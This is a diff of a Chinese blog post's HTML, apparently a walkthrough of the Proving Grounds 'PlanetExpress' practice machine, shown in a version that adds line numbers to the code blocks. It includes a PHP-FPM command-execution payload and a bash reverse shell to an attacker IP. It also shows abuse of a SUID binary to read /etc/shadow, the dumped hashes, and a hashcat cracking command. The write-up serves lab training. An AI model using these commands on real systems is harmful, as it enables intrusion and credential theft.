@@ -7,19 +7,19 @@
     <meta name="robots" content="noodp" />
     <title>ProvingGrounds PlanetExpress Writeup - Xavier&#39;s Blog</title><meta name="author" content="Xavier">
 <meta name="author-link" content="">
-<meta name="description" content="PlanetExpress 第10台，Linux系统，难度Easy，名称 PlanetExpress 192.168.176.205 PortScan ┌──(xavier㉿kali)-[~/Desktop/OSCP] └─$ sudo nmap -n -r --min-rate=3500 -sSV 192.168.176.205 -T4" /><meta name="keywords" content='OSCP, PG_Practice' /><meta itemprop="name" content="ProvingGrounds PlanetExpress Writeup">
-<meta itemprop="description" content="PlanetExpress 第10台，Linux系统，难度Easy，名称 PlanetExpress 192.168.176.205 PortScan ┌──(xavier㉿kali)-[~/Desktop/OSCP] └─$ sudo nmap -n -r --min-rate=3500 -sSV 192.168.176.205 -T4"><meta itemprop="datePublished" content="2023-12-20T01:44:11+00:00" />
+<meta name="description" content="PlanetExpress 第10台，Linux系统，难度Easy，名称 PlanetExpress 192.168.176.205 PortScan 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ┌──(xavier㉿kali)-[~/Desktop/O" /><meta name="keywords" content='OSCP, PG_Practice' /><meta itemprop="name" content="ProvingGrounds PlanetExpress Writeup">
+<meta itemprop="description" content="PlanetExpress 第10台，Linux系统，难度Easy，名称 PlanetExpress 192.168.176.205 PortScan 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ┌──(xavier㉿kali)-[~/Desktop/O"><meta itemprop="datePublished" content="2023-12-20T01:44:11+00:00" />
 <meta itemprop="dateModified" content="2023-12-20T01:44:11+00:00" />
-<meta itemprop="wordCount" content="1585">
+<meta itemprop="wordCount" content="1770">
 <meta itemprop="keywords" content="OSCP,PG_Practice," /><meta property="og:title" content="ProvingGrounds PlanetExpress Writeup" />
-<meta property="og:description" content="PlanetExpress 第10台，Linux系统，难度Easy，名称 PlanetExpress 192.168.176.205 PortScan ┌──(xavier㉿kali)-[~/Desktop/OSCP] └─$ sudo nmap -n -r --min-rate=3500 -sSV 192.168.176.205 -T4" />
+<meta property="og:description" content="PlanetExpress 第10台，Linux系统，难度Easy，名称 PlanetExpress 192.168.176.205 PortScan 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ┌──(xavier㉿kali)-[~/Desktop/O" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://www.bthoughts.top/posts/provinggrounds-planetexpress/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2023-12-20T01:44:11+00:00" />
 <meta property="article:modified_time" content="2023-12-20T01:44:11+00:00" />
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="ProvingGrounds PlanetExpress Writeup"/>
-<meta name="twitter:description" content="PlanetExpress 第10台，Linux系统，难度Easy，名称 PlanetExpress 192.168.176.205 PortScan ┌──(xavier㉿kali)-[~/Desktop/OSCP] └─$ sudo nmap -n -r --min-rate=3500 -sSV 192.168.176.205 -T4"/>
+<meta name="twitter:description" content="PlanetExpress 第10台，Linux系统，难度Easy，名称 PlanetExpress 192.168.176.205 PortScan 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ┌──(xavier㉿kali)-[~/Desktop/O"/>
 <meta name="application-name" content="Xavier&#39;s Blog">
 <meta name="apple-mobile-web-app-title" content="Xavier&#39;s Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
     <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
@@ -32,7 +32,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "https:\/\/www.bthoughts.top\/posts\/provinggrounds-planetexpress\/"
-    },"genre": "posts","keywords": "OSCP, PG_Practice","wordcount":  1585 ,
+    },"genre": "posts","keywords": "OSCP, PG_Practice","wordcount":  1770 ,
     "url": "https:\/\/www.bthoughts.top\/posts\/provinggrounds-planetexpress\/","datePublished": "2023-12-20T01:44:11+00:00","dateModified": "2023-12-20T01:44:11+00:00","publisher": {
       "@type": "Organization",
       "name": ""},"author": {
@@ -189,7 +189,7 @@
       </h1></div><div class="post-meta">
       <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.jpeg" srcset="/resource/friends/me.jpeg, /resource/friends/me.jpeg 1.5x, /resource/friends/me.jpeg 2x" sizes="auto" data-title="Xavier" data-alt="Xavier" class="avatar" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>&nbsp;Xavier</span></span>
           <span class="post-category">收录于 <a href="/categories/%E9%9D%B6%E5%9C%BA/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 靶场</a></span></div>
-      <div class="post-meta-line"><span title=2023-12-20&#32;01:44:11><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-12-20">2023-12-20</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 1585 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 4 分钟</span>&nbsp;</div>
+      <div class="post-meta-line"><span title=2023-12-20&#32;01:44:11><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-12-20">2023-12-20</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 1770 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 4 分钟</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>目录</span>
@@ -208,7 +208,26 @@
 <p>第10台，Linux系统，难度Easy，名称 PlanetExpress</p>
 <p>192.168.176.205</p>
 <h2 id="portscan">PortScan</h2>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP<span class="o">]</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ sudo nmap -n -r --min-rate<span class="o">=</span><span class="m">3500</span> -sSV 192.168.176.205 -T4  
 </span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> xavier 的密码：
 </span></span><span class="line"><span class="cl">Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-12-19 14:32 CST
@@ -223,8 +242,47 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 </span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 50.54 seconds
-</span></span></code></pre></div><h2 id="webscan">WebScan</h2>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="webscan">WebScan</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ dirsearch -x 400,403,404  -t <span class="m">500</span> -e php,asp,aspx,ini,txt,bak -u http://192.168.176.205      
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">  _<span class="p">|</span>. _ _  _  _  _ _<span class="p">|</span>_    v0.4.2
@@ -257,8 +315,33 @@
 </span></span><span class="line"><span class="cl"><span class="o">[</span>14:40:53<span class="o">]</span> <span class="m">200</span> -    0B  - /vendor/composer/autoload_classmap.php             
 </span></span><span class="line"><span class="cl">                                                                             
 </span></span><span class="line"><span class="cl">Task Completed
-</span></span></code></pre></div><p>扫描二级目录（总忘……）</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>扫描二级目录（总忘……）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ dirsearch -x 400,403,404  -t <span class="m">500</span> -e php,asp,aspx,ini,txt,bak -u http://192.168.176.205/config/ 
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">  _<span class="p">|</span>. _ _  _  _  _ _<span class="p">|</span>_    v0.4.2                                                                     
@@ -277,7 +360,26 @@
 </span></span><span class="line"><span class="cl"><span class="o">[</span>15:20:48<span class="o">]</span> <span class="m">200</span> -  812B  - /config/config.yml                                
 </span></span><span class="line"><span class="cl">                                                                             
 </span></span><span class="line"><span class="cl">Task Completed 
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ curl <span class="s2">&#34;http://192.168.176.205/config/config.yml&#34;</span>
 </span></span><span class="line"><span class="cl">……
 </span></span><span class="line"><span class="cl"><span class="c1">## </span>
@@ -290,7 +392,9 @@
 </span></span><span class="line"><span class="cl">└─$ curl <span class="s2">&#34;http://192.168.176.205/config/.gitignore&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># This file is meant to be empty</span>
 </span></span><span class="line"><span class="cl">                                 
-</span></span></code></pre></div><p>注意到config.yml中最末尾的注释，启用了自己开发的插件PicoTest。</p>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>注意到config.yml中最末尾的注释，启用了自己开发的插件PicoTest。</p>
 <p>访问发现是phpinfo</p>
 <p><img loading="lazy" src="resource/10-L-E-PlanetExpress.assets/image-20231219152745924.png" srcset="/posts/provinggrounds-planetexpress/resource/10-L-E-PlanetExpress.assets/image-20231219152745924.png, resource/10-L-E-PlanetExpress.assets/image-20231219152745924.png 1.5x, /posts/provinggrounds-planetexpress/resource/10-L-E-PlanetExpress.assets/image-20231219152745924.png 2x" sizes="auto" data-title="image-20231219152745924" data-alt="image-20231219152745924" width="2512" height="1112" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <h2 id="init-access">Init Access</h2>
@@ -300,9 +404,32 @@
 <p>尝试读取文件成功：</p>
 <p><img loading="lazy" src="resource/10-L-E-PlanetExpress.assets/image-20231220011249841.png" srcset="/posts/provinggrounds-planetexpress/resource/10-L-E-PlanetExpress.assets/image-20231220011249841.png, resource/10-L-E-PlanetExpress.assets/image-20231220011249841.png 1.5x, /posts/provinggrounds-planetexpress/resource/10-L-E-PlanetExpress.assets/image-20231220011249841.png 2x" sizes="auto" data-title="image-20231220011249841" data-alt="image-20231220011249841" width="1644" height="1680" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>尝试命令执行，回头看下phpinfo中的disable_functions，以下函数被禁用。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">disable_functions	system,exec,shell_exec,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,
-</span></span></code></pre></div><p>最后找来这个函数: passthru</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice<span class="o">]</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">disable_functions	system,exec,shell_exec,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最后找来这个函数: passthru</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ python3 fpm.py 192.168.244.205 <span class="s2">&#34;/var/www/html/planetexpress/index.php&#34;</span> -c <span class="s1">&#39;&lt;?php passthru(&#34;id&#34;); ?&gt;&#39;</span> <span class="p">|</span> head     
 </span></span><span class="line"><span class="cl">Content-type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
 </span></span><span class="line"><span class="cl">
@@ -314,12 +441,42 @@
 </span></span><span class="line"><span class="cl">&lt;!--<span class="o">[</span><span class="k">if</span> gt IE 8<span class="o">]</span>&gt;&lt;!--&gt; &lt;html <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;no-js&#34;</span>&gt; &lt;!--&lt;!<span class="o">[</span>endif<span class="o">]</span>--&gt;
 </span></span><span class="line"><span class="cl">        &lt;head&gt;
 </span></span><span class="line"><span class="cl">        &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span>&gt;
-</span></span></code></pre></div><p>反向连接，这里外连最好用80，因为其他端口可能有限制外联：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>反向连接，这里外连最好用80，因为其他端口可能有限制外联：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ python3 fpm.py 192.168.244.205 <span class="s2">&#34;/var/www/html/planetexpress/index.php&#34;</span> -c <span class="s1">&#39;&lt;?php passthru(&#34;bash -c \&#34;bash -i &gt;&amp; /dev/tcp/192.168.45.203/80 0&gt;&amp;1\&#34;&#34;); ?&gt;&#39;</span> <span class="p">|</span> head
-</span></span></code></pre></div><p><img loading="lazy" src="resource/10-L-E-PlanetExpress.assets/image-20231220014144818.png" srcset="/posts/provinggrounds-planetexpress/resource/10-L-E-PlanetExpress.assets/image-20231220014144818.png, resource/10-L-E-PlanetExpress.assets/image-20231220014144818.png 1.5x, /posts/provinggrounds-planetexpress/resource/10-L-E-PlanetExpress.assets/image-20231220014144818.png 2x" sizes="auto" data-title="image-20231220014144818" data-alt="image-20231220014144818" width="1654" height="512" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="resource/10-L-E-PlanetExpress.assets/image-20231220014144818.png" srcset="/posts/provinggrounds-planetexpress/resource/10-L-E-PlanetExpress.assets/image-20231220014144818.png, resource/10-L-E-PlanetExpress.assets/image-20231220014144818.png 1.5x, /posts/provinggrounds-planetexpress/resource/10-L-E-PlanetExpress.assets/image-20231220014144818.png 2x" sizes="auto" data-title="image-20231220014144818" data-alt="image-20231220014144818" width="1654" height="512" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <h2 id="pe">PE</h2>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">www-data@planetexpress:~$ find / -perm -u<span class="o">=</span>s -type f -exec ls -l <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">www-data@planetexpress:~$ find / -perm -u<span class="o">=</span>s -type f -exec ls -l <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null
 </span></span><span class="line"><span class="cl">&lt; / -perm -u<span class="o">=</span>s -type f -exec ls -l <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null
 </span></span><span class="line"><span class="cl">-rwsr-xr-- <span class="m">1</span> root messagebus <span class="m">51184</span> Jul  <span class="m">5</span>  <span class="m">2020</span> /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 </span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">436552</span> Jan <span class="m">31</span>  <span class="m">2020</span> /usr/lib/openssh/ssh-keysign
@@ -335,8 +492,35 @@
 </span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">44440</span> Jul <span class="m">27</span>  <span class="m">2018</span> /usr/bin/newgrp
 </span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">157192</span> Jan <span class="m">20</span>  <span class="m">2021</span> /usr/bin/sudo
 </span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">84016</span> Jul <span class="m">27</span>  <span class="m">2018</span> /usr/bin/gpasswd
-</span></span></code></pre></div><p>注意到这个relayd命令，查看帮助</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">www-data@planetexpress:~$ /usr/sbin/relayd -h
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>注意到这个relayd命令，查看帮助</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">www-data@planetexpress:~$ /usr/sbin/relayd -h
 </span></span><span class="line"><span class="cl">/usr/sbin/relayd -h
 </span></span><span class="line"><span class="cl">Usage: relayd <span class="o">[</span>options<span class="o">]</span> <span class="o">[</span>actions<span class="o">]</span>
 </span></span><span class="line"><span class="cl">Actions:
@@ -357,9 +541,41 @@
 </span></span><span class="line"><span class="cl">  -P <span class="o">[</span>file<span class="o">]</span>           <span class="nb">set</span> pid file <span class="k">for</span> daemon
 </span></span><span class="line"><span class="cl">  -g <span class="o">[</span>ip<span class="o">]</span>             remote <span class="nb">source</span> ip
 </span></span><span class="line"><span class="cl">  -n <span class="o">[</span>port<span class="o">]</span>           remote <span class="nb">source</span> port
-</span></span></code></pre></div><p>有个-C读取文件的选项，因为是suid权限，可以读取任何文件，而且该命令操作后，可导致原该权限文件被任何人可读。</p>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>有个-C读取文件的选项，因为是suid权限，可以读取任何文件，而且该命令操作后，可导致原该权限文件被任何人可读。</p>
 <p>拿到密码hash</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">www-data@planetexpress:~/html/planetexpress/plugins$ ls -l /etc/shadow
 </span></span><span class="line"><span class="cl">-rw-r----- <span class="m">1</span> root shadow <span class="m">940</span> Jan <span class="m">10</span>  <span class="m">2022</span> /etc/shadow
 </span></span><span class="line"><span class="cl">
@@ -385,8 +601,28 @@
 </span></span><span class="line"><span class="cl">mail:*:18555:0:99999:7:::
 </span></span><span class="line"><span class="cl">news:*:18555:0:99999:7:::
 </span></span><span class="line"><span class="cl">www-data@planetexpress:~$ 
-</span></span></code></pre></div><p>破解密码</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>破解密码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ hashcat -m <span class="m">1800</span> 1.hash  /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
 </span></span><span class="line"><span class="cl">
